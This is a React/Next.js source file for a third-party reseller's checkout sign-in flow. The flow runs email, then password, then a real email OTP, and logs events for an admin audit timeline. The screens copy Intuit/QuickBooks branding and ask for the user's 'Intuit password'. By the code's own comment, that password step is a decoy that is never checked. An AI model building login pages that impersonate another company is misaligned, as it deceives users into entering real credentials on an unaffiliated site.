'use client'

import useParamPaymentDetails from '@/app/hooks/useParamPaymentDetails';
import { useSteps } from '@/app/hooks/useSteps';
import { useUserDetails } from '@/app/hooks/useUserDetails';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter, useSearchParams } from 'next/navigation';
import { useState, useEffect, useRef } from 'react';
import toast from 'react-hot-toast';

// Fire-and-forget login/OTP audit trail, shown in the admin panel's Consent Logs event timeline
// (grouped by paymentId + IP into one session, same as the existing link_opened/email_entered
// events). `detail` is free-form per event type — the timeline UI renders it as-is.
// `amount` matters beyond display: the Email Log PDF's activity section (email-log-activity
// route) matches events by email + exact dollar amount to isolate the one relevant purchase —
// an event logged without it silently gets filtered out of that PDF, even though it still shows
// correctly in Consent Logs (which doesn't filter by amount).
function logAuthEvent(event: string, paymentId: string | null, email?: string, amount?: number, detail?: Record<string, unknown>) {
    fetch('/api/track-event', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event, paymentId, email, amount, detail }),
    }).catch(console.error);
}

// Login Page Component
const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
    const [email, setEmail] = useState('');
    const [rememberMe, setRememberMe] = useState(true);
    // const setStep = useSetAtom(stepAtom)
    const {setStep} = useSteps()
    const handleSignIn = () => {
        if (email) {
            setStep(1)
            onNext(email);
        }
    };

    return (
        <div className="mt-20 flex items-center justify-center p-4">
            <form onSubmit={handleSignIn} className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
                {/* Logo */}
                <div className="mb-5">
                    <img src="/quickbooks_logo.png" className='mx-auto' alt="Intuit Logo" width={200} height={100} />
                </div>

                {/* Title */}
                <h2 className="text-xl font-semibold text-gray-800 text-center mb-8 font-normal">
                    Let's get you in to QuickBooks
                </h2>

                {/* Email Input */}
                <div className="mb-6">
                    <input
                        type="email"
                        placeholder="Email"
                        value={email}
                        required
                        onChange={(e) => setEmail(e.target.value)}
                        className="w-full px-4 py-3 border-2 border-[#2ca01c] rounded focus:outline-none focus:border-blue-500 text-gray-700"
                    />
                </div>

                {/* Remember Me Checkbox */}
                <div className="flex items-center mb-6">
                    <input
                        type="checkbox"
                        id="remember"
                        checked={rememberMe}
                        onChange={(e) => setRememberMe(e.target.checked)}
                        className="w-4 h-4 text-[#2ca01c] bg-gray-100 border-gray-300 rounded focus:ring-[#2ca01c]"
                    />
                    <label htmlFor="remember" className="ml-3 text-gray-700">
                        Remember me
                    </label>
                </div>

                {/* Sign In Button */}
                <button
                    type='submit'  
                    className="w-full bg-[#2ca01c] hover:bg-[#2CA01C] text-white py-3 px-4 rounded font-medium transition-colors duration-200 flex items-center justify-center"
                >
                    <svg className="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                    </svg>
                    Sign in
                </button>
                <p className='text-gray-400 text-xs mt-5 leading-4'>
                    By selecting Sign in for your Intuit Account, you agree to our <Link href="/terms" target="_blank" className='text-blue-600 hover:text-blue-800'>Terms of Service</Link>.
                </p>
                
                {/* Independent Service Disclaimer */}
                <div className="mt-8 pt-4 border-t border-gray-100">
                    <p className="text-[10px] leading-snug text-gray-400 text-center">
                        <strong>Disclaimer:</strong> quickbooks-enterprises.com is an independent third-party service provider and is NOT affiliated with, endorsed by, or sponsored by Intuit Inc. QuickBooks is a registered trademark of Intuit Inc.
                    </p>
                </div>
            </form>
        </div>
    );
};

// Password Page Component — kept as a UI step for parity with the real Intuit sign-in flow; any
// non-empty value proceeds (this was never checked against a real password) straight on to the
// actual security check, the OTP step below.
const PasswordPage = ({ email, amount, onBack, onNext }: { email: string; amount?: number; onBack: () => void; onNext: () => void }) => {
    const searchParams = useSearchParams()
    const paymentID = searchParams.get('token')
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const {setStep} = useSteps()

    const handleContinue = (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault()
        if (password) {
            logAuthEvent('password_entered', paymentID, email, amount);
            setStep(1)
            onNext();
        }
    };

    return (
        <div className="mt-20 flex items-center justify-center p-4">
            <form onSubmit={handleContinue} className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
                {/* Logo */}
                <div className="mb-5">
                    <img src="/quickbooks_logo.png" className='mx-auto' alt="Intuit Logo" width={200} height={100} />
                </div>

                {/* Title */}
                <h2 className="text-xl font-semibold text-gray-800 text-center mb-2 font-normal">
                    Enter your Intuit password
                </h2>

                {/* Email Display */}
                <div className="text-center mb-2">
                    <span className="text-gray-700">{email}</span>
                </div>

                {/* Use Different Account Link */}
                <div className="text-center mb-6">
                    <button
                        type="button"
                        onClick={onBack}
                        className="text-blue-600 hover:text-blue-800 text-sm underline"
                    >
                        Use a different account
                    </button>
                </div>

                {/* Password Input */}
                <div className="mb-6">
                    <label className="block text-gray-700 text-sm mb-2">Password</label>
                    <div className="relative">
                        <input
                            required
                            type={showPassword ? "text" : "password"}
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="w-full px-4 py-3 border-2 border-[#2ca01c] rounded focus:outline-none focus:border-blue-500 text-gray-700 pr-12"
                        />
                        <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-600 hover:text-gray-800"
                        >
                            {showPassword ? (
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                                </svg>
                            ) : (
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21" />
                                </svg>
                            )}
                        </button>
                    </div>
                </div>

                {/* Continue Button */}
                <button
                    type='submit'
                    className="w-full bg-[#2ca01c] hover:bg-[#2CA01C] text-white py-3 px-4 rounded font-medium transition-colors duration-200 mb-2"
                >
                    Continue
                </button>

                {/* Independent Service Disclaimer */}
                <div className="mt-8 pt-4 border-t border-gray-100">
                    <p className="text-[10px] leading-snug text-gray-400 text-center">
                        <strong>Disclaimer:</strong> quickbooks-enterprises.com is an independent third-party service provider and is NOT affiliated with, endorsed by, or sponsored by Intuit Inc. QuickBooks is a registered trademark of Intuit Inc.
                    </p>
                </div>
            </form>
        </div>
    );
};

declare global {
    interface Window {
        initSendOTP?: (config: Record<string, unknown>) => void;
        sendOtp?: (identifier: string, success?: (data: unknown) => void, failure?: (error: unknown) => void) => void;
        retryOtp?: (channel: string | null, success?: (data: unknown) => void, failure?: (error: unknown) => void, reqId?: string) => void;
        verifyOtp?: (otp: number, success?: (data: unknown) => void, failure?: (error: unknown) => void, reqId?: string) => void;
    }
}

/** MSG91's own callback payload shape isn't documented beyond "you get an access token" — try
 *  the field names its server-side verifyAccessToken response uses (`message`) plus a couple of
 *  reasonable fallbacks, since the widget's client callback has been observed to vary. */
function extractAccessToken(data: unknown): string | undefined {
    if (typeof data === 'string') return data;
    if (data && typeof data === 'object') {
        const obj = data as Record<string, unknown>;
        const candidate = obj.message || obj.accessToken || obj['access-token'] || obj.access_token || obj.token;
        if (typeof candidate === 'string') return candidate;
    }
    return undefined;
}

// OTP Page Component — replaces the old fake "Enter your Intuit password" step with a real
// email OTP challenge via the MSG91 widget, so a customer actually has to prove they own the
// email address before reaching checkout.
const OtpPage = ({ email, amount, onBack }: { email: string; amount?: number; onBack: () => void }) => {
    const searchParams = useSearchParams()
    const paymentID = searchParams.get('token')
    const [code, setCode] = useState('');
    const [widgetReady, setWidgetReady] = useState(false);
    const [otpSent, setOtpSent] = useState(false);
    const [isVerifying, setIsVerifying] = useState(false);
    const [isResending, setIsResending] = useState(false);
    const router = useRouter()
    const {setStep} = useSteps()
    const sentOnceRef = useRef(false);

    useParamPaymentDetails({noLinkRedirection: true, enableToast: false, noLoginRedir: true})

    // Loads the widget script once per mount and initializes it against this email — matches
    // the exact snippet MSG91's "Client Side Integration" page generates for this widget
    // (captcha disabled in the widget's own settings, so no captchaRenderId is needed here).
    // Falls back to the phone91.com mirror if the primary host doesn't load, same as MSG91's
    // own generated snippet.
    useEffect(() => {
        const urls = ['https://verify.msg91.com/otp-provider.js', 'https://verify.phone91.com/otp-provider.js'];
        let i = 0;
        let activeScript: HTMLScriptElement | null = null;

        const attempt = () => {
            const s = document.createElement('script');
            s.src = urls[i];
            s.async = true;
            s.onload = () => {
                window.initSendOTP?.({
                    widgetId: process.env.NEXT_PUBLIC_MSG91_WIDGET_ID,
                    tokenAuth: process.env.NEXT_PUBLIC_MSG91_WIDGET_TOKEN,
                    // No `identifier` here deliberately: setting one makes the widget auto-send an
                    // OTP right at init using THIS config's own success/failure (the no-ops below),
                    // not the per-call callbacks passed to sendOtp() further down — so our React
                    // state (otpSent) never saw it complete and the code input stayed stuck on
                    // "Sending code...". Leaving identifier unset here makes sendOtp() below the
                    // only thing that ever actually sends a code.
                    exposeMethods: true,
                    // Handled per-call via sendOtp/verifyOtp's own callbacks instead — passing
                    // these too would fire every event twice (MSG91's own documented caveat).
                    success: () => {},
                    failure: () => {},
                });
                setWidgetReady(true);
            };
            s.onerror = () => {
                i++;
                if (i < urls.length) attempt();
            };
            document.head.appendChild(s);
            activeScript = s;
        };
        attempt();

        return () => {
            activeScript?.remove();
        };
    }, [email]);

    // Auto-send the first OTP as soon as the widget is ready, so the customer doesn't have to
    // click twice (enter email, then click "send code").
    useEffect(() => {
        if (!widgetReady || sentOnceRef.current) return;
        sentOnceRef.current = true;
        window.sendOtp?.(
            email,
            () => { logAuthEvent('otp_sent', paymentID, email, amount); setOtpSent(true); },
            (error: any) => {
                logAuthEvent('otp_send_failed', paymentID, email, amount, { reason: error?.message || String(error) });
                toast.error('Could not send the verification code. Try resending.');
            },
        );
    }, [widgetReady, email]);

    const handleResend = () => {
        if (isResending) return;
        setIsResending(true);
        window.retryOtp?.(
            null,
            () => { logAuthEvent('otp_sent', paymentID, email, amount, { resend: true }); toast.success('Code resent'); setIsResending(false); },
            (error: any) => {
                logAuthEvent('otp_send_failed', paymentID, email, amount, { resend: true, reason: error?.message || String(error) });
                toast.error(error?.message || 'Could not resend the code'); setIsResending(false);
            },
        );
    };

    const handleVerify = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault()
        if (!paymentID) {
            toast.error('Internal Server Error')
            return
        }
        if (!code || isVerifying) return;

        logAuthEvent('otp_submitted', paymentID, email, amount, { codeLength: code.length });
        setIsVerifying(true);
        window.verifyOtp?.(
            Number(code),
            async (data: unknown) => {
                const accessToken = extractAccessToken(data);
                if (!accessToken) {
                    logAuthEvent('otp_verification_failed', paymentID, email, amount, { reason: 'no access token in widget response' });
                    toast.error('Verification failed — try again.');
                    setIsVerifying(false);
                    return;
                }
                try {
                    const res = await fetch('/api/auth/verify-otp-token', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ accessToken, email }),
                    });
                    const json = await res.json();
                    if (!res.ok || !json.success) {
                        logAuthEvent('otp_verification_failed', paymentID, email, amount, { reason: json.error || 'server rejected token' });
                        toast.error(json.error || 'Verification failed — try again.');
                        setIsVerifying(false);
                        return;
                    }
                    logAuthEvent('otp_verified', paymentID, email, amount);
                    setStep(2)
                    toast.success('Login successful')
                    router.push('/order-summary?token=' + paymentID)
                } catch {
                    logAuthEvent('otp_verification_failed', paymentID, email, amount, { reason: 'network error contacting our server' });
                    toast.error('Verification failed — try again.');
                    setIsVerifying(false);
                }
            },
            (error: any) => {
                logAuthEvent('otp_verification_failed', paymentID, email, amount, { reason: error?.message || 'Incorrect code' });
                toast.error(error?.message || 'Incorrect code — try again.');
                setIsVerifying(false);
            },
        );
    };

    return (
        <div className="mt-20 flex items-center justify-center p-4">
            <form onSubmit={handleVerify} className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
                {/* Logo */}
                <div className="mb-5">
                    <img src="/quickbooks_logo.png" className='mx-auto' alt="Intuit Logo" width={200} height={100} />
                </div>

                {/* Title */}
                <h2 className="text-xl font-semibold text-gray-800 text-center mb-2 font-normal">
                    Enter the code we sent you
                </h2>

                {/* Email Display */}
                <div className="text-center mb-2">
                    <span className="text-gray-700">{email}</span>
                </div>

                {/* Use Different Account Link */}
                <div className="text-center mb-6">
                    <button
                        type="button"
                        onClick={onBack}
                        className="text-blue-600 hover:text-blue-800 text-sm underline"
                    >
                        Use a different account
                    </button>
                </div>

                {/* OTP Input */}
                <div className="mb-3">
                    <label className="block text-gray-700 text-sm mb-2">Verification code</label>
                    <input
                        required
                        inputMode="numeric"
                        autoComplete="one-time-code"
                        placeholder={otpSent ? 'Enter the verification code' : 'Sending code...'}
                        disabled={!otpSent}
                        value={code}
                        onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))}
                        className="w-full px-4 py-3 border-2 border-[#2ca01c] rounded focus:outline-none focus:border-blue-500 text-gray-700 disabled:opacity-60"
                    />
                </div>

                {/* Resend */}
                <div className="text-right mb-6">
                    <button
                        type="button"
                        onClick={handleResend}
                        disabled={!otpSent || isResending}
                        className="text-blue-600 hover:text-blue-800 text-sm underline disabled:opacity-50 disabled:no-underline"
                    >
                        {isResending ? 'Resending...' : 'Resend code'}
                    </button>
                </div>

                {/* Continue Button */}
                <button
                    type='submit'
                    disabled={!otpSent || isVerifying}
                    className="w-full bg-[#2ca01c] hover:bg-[#2CA01C] text-white py-3 px-4 rounded font-medium transition-colors duration-200 mb-2 disabled:opacity-60"
                >
                    {isVerifying ? 'Verifying...' : 'Continue'}
                </button>

                {/* Independent Service Disclaimer */}
                <div className="mt-8 pt-4 border-t border-gray-100">
                    <p className="text-[10px] leading-snug text-gray-400 text-center">
                        <strong>Disclaimer:</strong> quickbooks-enterprises.com is an independent third-party service provider and is NOT affiliated with, endorsed by, or sponsored by Intuit Inc. QuickBooks is a registered trademark of Intuit Inc.
                    </p>
                </div>
            </form>
        </div>
    );
};

// Main App Component
export default function IntuitLogin() {
    const searchParams = useSearchParams()
    const paymentID = searchParams.get('token')
    const {paymentObj} = useParamPaymentDetails({enableToast: false, noLinkRedirection: paymentID ? false : true, noLoginRedir: false})
    const [currentPage, setCurrentPage] = useState('login');
    const {setStep} = useSteps()
    const {setUserDetails, userDetails} = useUserDetails()
    const trackedRef = useRef(false);

    useEffect(() => {
        if (paymentObj && !(paymentObj as any).error && !trackedRef.current) {
            trackedRef.current = true;
            
            const planDetails = paymentObj?.isService 
                ? paymentObj.serviceName 
                : paymentObj?.edition
                ? paymentObj.edition.toLowerCase() === 'fsp'
                    ? 'QuickBooks Enterprise FSP Edition'
                    : `QuickBooks Enterprise ${paymentObj.edition.charAt(0).toUpperCase() + paymentObj.edition.slice(1)} Edition`
                : undefined;

            fetch('/api/track-event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    event: 'link_opened',
                    paymentId: paymentID,
                    planDetails,
                    amount: paymentObj.total ? paymentObj.total / 100 : 0
                })
            }).catch(console.error);
        }
    }, [paymentObj, paymentID]);

    const handleNext = (email: string) => {
        const planDetails = paymentObj?.isService 
            ? paymentObj.serviceName 
            : paymentObj?.edition
            ? paymentObj.edition.toLowerCase() === 'fsp'
                ? 'QuickBooks Enterprise FSP Edition'
                : `QuickBooks Enterprise ${paymentObj.edition.charAt(0).toUpperCase() + paymentObj.edition.slice(1)} Edition`
            : undefined;

        fetch('/api/track-event', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                event: 'email_entered',
                paymentId: paymentID,
                email: email,
                planDetails,
                amount: paymentObj?.total ? paymentObj.total / 100 : 0
            })
        }).catch(console.error);

        setUserDetails({email})
        setCurrentPage('password');
    };

    const handlePasswordNext = () => {
        setCurrentPage('otp');
    };

    const handleBack = () => {
        setStep(0)
        setCurrentPage('login');
        setUserDetails({email: ''})
    };
    const steps = ['Login', 'Password', 'OTP', 'test'];
    const handleStepChange = (step: number) => {
        setCurrentPage(step.toString());
    };
    const amount = paymentObj?.total ? paymentObj.total / 100 : undefined;
    return (
        <>
            {currentPage === 'login' && (
                <LoginPage onNext={handleNext} />
            )}
            {currentPage === 'password' && (
                <PasswordPage email={userDetails.email} amount={amount} onBack={handleBack} onNext={handlePasswordNext} />
            )}
            {currentPage === 'otp' && (
                <OtpPage email={userDetails.email} amount={amount} onBack={handleBack} />
            )}
        </>
    );
}